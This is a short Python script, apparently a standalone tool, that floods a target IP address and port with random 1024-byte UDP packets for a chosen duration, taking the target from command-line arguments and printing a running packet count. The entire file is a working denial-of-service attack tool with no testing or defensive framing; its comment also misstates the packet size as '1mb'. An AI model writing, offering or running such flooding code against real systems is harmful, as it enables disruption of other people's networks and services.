import sys 
import socket 
import time 
import random


def udp_flood(target_ip, target_port, duration):
    # Init the sender socket and data to send
    sender = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1024) # sending 1mb
    timer = time.time() + duration

    # Flood
    package_count = 0
    while time.time() <= timer:
        sender.sendto(data, (target_ip, target_port))
        package_count += 1
        print("%s packages sent | @%s | port: %s "%(package_count, target_ip, target_port))


if __name__ == "__main__":
    print("Type on cmd: python udp_flood targer_ip target_port duration, python3 on linux term")
    udp_flood(sys.argv[1], int(sys.argv[2]), float(sys.argv[3]))